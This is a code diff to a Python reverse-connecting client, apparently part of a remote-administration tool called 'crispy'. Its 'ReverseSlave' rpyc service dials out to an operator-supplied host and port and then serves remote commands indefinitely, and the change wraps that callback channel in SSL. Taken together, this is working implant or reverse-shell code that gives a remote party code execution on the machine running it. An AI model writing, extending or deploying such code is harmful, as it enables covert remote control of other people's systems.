@@ -3,8 +3,10 @@ import socket
 import sys
 
 from rpyc.core.service import Service, ModuleNamespace
+from crispy.network.client_type import SSLClient
 from rpyc.utils.factory import connect_stream
 from rpyc.core.stream import SocketStream
+from rpyc import Connection, Channel
 from rpyc.lib.compat import execute
 
 class ReverseSlave(Service):
@@ -57,14 +59,14 @@ class ReverseSlave(Service):
 
 def main():
     if len(sys.argv) == 2:
-        addr, port = sys.argv[1].split(":") 
+        host, port = sys.argv[1].split(":") 
 
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((addr, int(port)))
-            stream = SocketStream(s)
-            conn = connect_stream(stream, ReverseSlave, {})
-            
+            #client = SSLClient(keyfile="key.pem", certfile="cert.pem")
+            client = SSLClient()
+            s = client.connect(host, int(port))
+            conn = connect_stream(SocketStream(s), ReverseSlave, {})
+
             while True:
                conn.serve_all()
         except KeyboardInterrupt:
